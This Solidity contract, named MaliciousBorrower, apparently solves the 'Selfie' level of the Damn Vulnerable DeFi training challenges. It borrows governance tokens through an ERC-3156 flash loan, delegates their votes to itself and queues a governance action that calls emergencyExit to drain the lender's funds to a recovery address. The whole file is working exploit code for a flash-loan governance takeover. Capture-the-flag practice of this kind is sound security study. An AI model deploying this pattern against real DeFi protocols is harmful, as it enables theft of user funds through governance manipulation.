// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";

contract MaliciousBorrower is IERC3156FlashBorrower {
    IERC3156FlashLender lender;
    SimpleGovernance governance;
    address recovery;

    constructor(IERC3156FlashLender _lender, SimpleGovernance _gov, address _recovery) {
        lender = _lender;
        governance = _gov;
        recovery = _recovery;
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        override
        returns (bytes32)
    {
        require(msg.sender == address(lender), "FlashBorrower: Untrusted lender");
        require(initiator == address(this), "FlashBorrower: Untrusted loan initiator");
        // delegate loaned voting tokens to this address
        DamnValuableVotes(token).delegate(address(this));
        // queue action in governance to call emergencyExit
        uint256 actionId = governance.queueAction(
            address(lender), 0, abi.encodeWithSignature("emergencyExit(address)", address(recovery))
        );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /// @dev Initiate a flash loan
    function flashBorrow(address token, uint256 amount) public {
        IERC20(token).approve(address(lender), amount);
        lender.flashLoan(this, token, amount, bytes(""));
    }
}
